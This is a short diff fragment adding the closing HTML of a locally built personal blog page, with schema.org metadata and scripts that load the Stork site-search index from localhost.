+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "http://localhost:1337",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("http://localhost:1337/theme/stork/stork.wasm")
+      stork.register("sitesearch", "http://localhost:1337/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="http://localhost:1337/theme/stork/stork.js"></script>
+
+</body>
+</html>
